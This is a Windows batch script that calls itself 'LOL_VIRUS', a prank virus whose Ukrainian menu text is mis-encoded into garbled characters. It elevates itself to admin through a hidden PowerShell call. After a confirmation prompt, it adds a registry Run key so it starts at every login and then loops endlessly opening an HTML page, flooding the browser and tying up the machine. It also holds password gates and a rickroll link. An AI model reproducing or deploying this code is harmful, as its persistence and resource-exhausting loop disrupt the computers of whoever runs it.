@echo off
call :Adm
title ‚¢¥¤iâì ¯ à®«ì...
chcp 866
color a
cls
goto pwd

:pwd
echo ã¤ì « áª , ¢¢¥¤iâì ¯ à®«ì (? ïªé® ¯®âà?¡­  ¤®¯®¬®£ )

echo.
Set /p choice=" à®«ì: "
if not defined choice goto pwd
if "%choice%"=="ggytprgs" (goto vir)
if "%choice%"=="?" (goto ?)
cls
goto pwd

:vir
title LOL_VIRUS By GGYT Progs and help from DiopinYT
cls
type C:\LOL_VIRUS\files\art.txt
echo ‚¨¡¥àiâì ¤iî:
echo.
echo 1 - ®ç â¨ ¢¨¡ãå Š
echo 2 - ‚¨©â¨
echo 3 - … ‚ˆˆ€’ˆ
echo 4 - ‚¨¤ «¨â¨ ¢?àãá ?§  ¢â®§ ¢ ­â ¦¥­­ï
echo 5 - –¥­âà ®­®¢«¥­ì (­¥ áª®à®)
echo 6 - „¥ ¡ãâ¨ ¢iàãá?
echo 7 - ???

echo.
Set /p choice="‚ è ¢¨¡ià: "
if not defined choice goto vir
if "%choice%"=="1" (goto q)
if "%choice%"=="2" (goto exit)
if "%choice%"=="3" (start C:\LOL_VIRUS\files\languages\ukr\NOT_OPEN_ME_PLEASE.html)
if "%choice%"=="4" (goto delregstartup)
if "%choice%"=="5" (goto vir)
if "%choice%"=="6" (goto path)
if "%choice%"=="7" (goto secrpwd)
cls
goto vir

:exit
set choice=0
cls
echo ‚¨ â®ç­® å®ç¥â¥ ¢¨©â¨? (y/n)
Set /p choice="‚¨¡ià: "
if not defined choice goto exit
if "%choice%"=="n" (goto vir)
if "%choice%"=="y" (exit)
cls
goto exit

:q
echo ‚¨ ¢¯¥¢­¥­i, é® å®ç¥â¥ §à®¡¨â¨ æ¥? (y/n)

echo.
Set /p choice="‚¨i: "
if not defined choice goto q
if "%choice%"=="y" (goto q2)
if "%choice%"=="n" (goto vir)
cls
goto q

:q2
echo Ž‘’€ò Ž……„†…Ÿ!!!
echo –ï ¯à®£à ¬  ¡ã¤¥ ¢ª«îç â¨áï ŠŽ†ŽƒŽ à §ã, ª®«¨ ¢¨ ¢¬¨ª óâ¥ á¢i© Š / Ž“’“Š !!! ‚¨ ¢¯¥¢­¥­i ã á¢®iå ¤?ïå? (y/n)
echo „“Œ€‰!!!

echo.
Set /p choice="‚ˆI: "
if not defined choice goto q2
if "%choice%"=="y" (goto xd)
if "%choice%"=="n" (goto vir)

:xd
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
goto yt

:yt
cd C:\LOL_VIRUS\files\
start base.html
goto yt

:delregstartup
cls
REG DELETE HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v LOL_VIRUS /t REG_SZ /d "C:\LOL_VIRUS\files\xd.bat"
cls
echo ‚?àãá ¯à¨ § ¯ãáªã ¢¨¤ «¥­®
pause
goto vir

:path
cls
echo.
echo ‚i­ ã C:\LOL_VIRUS
pause
goto vir

:secrpwd
cls
echo ‡€‰„? Š‹ž— “ ”€‰‹€• ‚?“‘“
echo n - ‚¨©â¨

echo.
Set /p choice="Š‹ž—: "
if not defined choice goto secrpwd
if "%choice%"=="14qw5t09" (goto rr)
if "%choice%"=="n" (goto vir)
cls
goto secrpwd

:rr
start C:\LOL_VIRUS\files\NGGYU.url
goto vir

:?
echo —¨â © ã¢ ¦­iè¥ ã ¬®ó¬ã à¥¯®§¨â®àii. ‚i­ â ¬ ­ ¯¨á ­¨©.
pause
goto pwd

:Adm
reg query "HKU\S-1-5-19\Environment" >nul 2>&1
if not %errorlevel% EQU 0 (
    cls
    powershell.exe -windowstyle hidden -noprofile "Start-Process '%~dpnx0' -Verb RunAs"
    exit 
)





